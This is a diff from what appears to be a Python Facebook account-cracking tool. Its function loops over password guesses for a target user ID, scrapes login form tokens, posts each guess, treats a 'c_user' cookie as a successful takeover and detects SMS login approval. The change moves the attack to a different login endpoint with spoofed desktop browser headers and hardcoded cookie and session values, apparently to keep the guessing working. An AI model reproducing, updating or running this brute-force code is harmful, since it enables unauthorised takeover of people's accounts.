@@ -1239,79 +1239,53 @@ def mbasic(uid,pwx,tl):
         for pw in pwx:
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com/').text
-            data =  {
-            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            'try_number': '0',
-            'unrecognized_tries': '0',
-            'email': uid,
-            'prefill_contact_point': '',
-            'prefill_source': '',
-            'prefill_type': '',
-            'first_prefill_source': '',
-            'first_prefill_type': '',
-            'had_cp_prefilled': 'false',
-            'had_password_prefilled': 'false',
-            'is_smart_lock': 'false',
-            'bi_xrwh': '0',
-            'bi_wvdp': '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow(){ [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
-            'fb_dtsg': 'NAcNnumvQnDoEGxbaPpVz-lKtmmlpH6vYvE7_favLJ2zNewjuCIEAVA:0:0',
+            data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'dyn': '1KQdAG1mws8-t0BBBzEnwuo98nwgU2owpUuwcC4o1nEhwem0iy1gCwjE1EE2Cwro0wa4o1MUaE36wdq0ny1Aw4vw8W0k-0jG3qaw4kwbS1Lw9C0hO3q0ue0QU',
-            'csr': '',
-            'req': '2',
-            'fmt': '1',
-            'a': 'AYnz28bXQjE7pHW-7J5Rzez58mWHq02Voe3srcZoh_ilXjNwpsAZ6b9e5sR4o-7xpCuxZGqZQOBK-cWZjFSwZcQ3TcyKw2zPKwW89qcnk1ffXQ',
-            'user': '0'}
-            cookies =  {
-            'dbln': '%7B%2261560567641731%22%3A%22sbCUMvzK%22%7D',
+            'email': uid,
+            'login_source': 'comet_headerless_login',
+            'next': '',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
+            cookies = {
             'datr': 'OstGZ9sw-xX6t8x0uWISu5oh',
             'sb': 'OstGZ0x6Arcou92IF2BALgFQ',
-            'm_pixel_ratio': '2.200000047683716',
             'ps_l': '1',
             'ps_n': '1',
             'locale': 'en_GB',
             'vpd': 'v1%3B968x491x2.200000047683716',
             'wl_cbv': 'v2%3Bclient_version%3A2682%3Btimestamp%3A1732715348',
-            'wd': '491x968',
-            'fr': '0bPmdaDqTCILtVoFs.AWUsbcEj3O8RXn524RTVcg5s14g.BnRss6..AAA.0.0.BnRyOZ.AWVvryVfusg',}
-            params = {
-            'api_key': '607603612709461',
-            'auth_token': 'ff4f1596ae5511da71a091d36f81b691',
-            'skip_api_login': '1',
-            'signed_next': '1',
-            'next': 'https://m.facebook.com/v12.0/dialog/oauth?response_type=code&redirect_uri=https%3A%2F%2Fbikroy.com%2Ffacebook-callback&scope=public_profile%2Cemail&client_id=607603612709461&ret=login&fbapp_pres=0&logger_id=1bdecab6-4837-4a41-963c-a148f65aa25d&tp=unspecified',
-            'refsrc': 'deprecated',
-            'app_id': '607603612709461',
-            'cancel': 'https://bikroy.com/facebook-callback?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied#_=_',
-            'lwv': '100',}
+            'm_pixel_ratio': '2.200000047683716',
+            'dpr': '2.418783187866211',
+            'sfau': 'AYgNkLjGTe1gHr_479HcvZEaK6GxqLaTuMXypBQ9hvnb7qibQ6qn37jS7Pq9wXjWkiXSdgM4LqQHDpkoIqARDRBmywQDcZT_fOxZArEvyUrnjJnvR8xaiNmJjPw6pIU1gPZutIoGD0lgsw3A6xMtD9kNZcQ8cuY7BuqhDlONLkSmnsFFqBmE-ZuMphawGajSEfEzIX4-h6e_fCPk896e3znjqGp-2lJ5n6rZ_jncGUYWR8b7O_-izeB5HGXKYFMRqDWkXYektFKIJmFCnTAWGuew',
+            'sfiu': 'AYhZoZTu_-72dnkHt69iesu1hMPG1AihofIn6wiVKmnKYReQ2TMtUACzmYy9GVwsp7-EKC286ynQMZNBiamaHGqOFuo7Rri-K-43MgQ5KSA4CDfAy-Wv0kWpZNIuz7PLXnAPcGXzTAguMor3PPFBGNzgpykK-TxNaC1tI2fpdXYqKVuXi5a6B4APMstc9IcD3WUu_VSyOj8PyQ5fYSA7APooXp7Iw8VFcEE6wRi9Ui_e3jB9plGLHv8ZfImFSwH49ln4Ba9AvLtk__vStSlYoy9s',
+            'fr': '0bPmdaDqTCILtVoFs.AWWodC7aGrstpwmB8K32LUUAvOY.BnRss6..AAA.0.0.BnRzQ2.AWWIRa5cCcM',
+            'wd': '891x1756',}
             headers = {
-            'authority': 'm.facebook.com',
-            'accept': '*/*',
+            'authority': 'www.facebook.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
+            'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://m.facebook.com',
-            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=607603612709461&kid_directed_site=0&app_id=607603612709461&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fbikroy.com%252Ffacebook-callback%26scope%3Dpublic_profile%252Cemail%26client_id%3D607603612709461%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1bdecab6-4837-4a41-963c-a148f65aa25d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fbikroy.com%2Ffacebook-callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
+            'dpr': '2.200000047683716',
+            'origin': 'https://www.facebook.com',
+            'referer': 'https://www.facebook.com/',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
             'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-model': '"23076PC4BI"',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"14.0.0"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Linux"',
+            'sec-ch-ua-platform-version': '""',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-            'x-asbd-id': '129477',
-            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'x-requested-with': 'XMLHttpRequest',
-            'x-response-format': 'JSONStream',}
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+            'viewport-width': '980',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://m.facebook.com/login/device-based/login/async/'
-            po = Session.post(url, params=params, cookies=cookies, headers=headers, data=data, allow_redirects = False).text
+            url = 'https://en-gb.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
+            po = Session.post(url, cookies=cookies, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
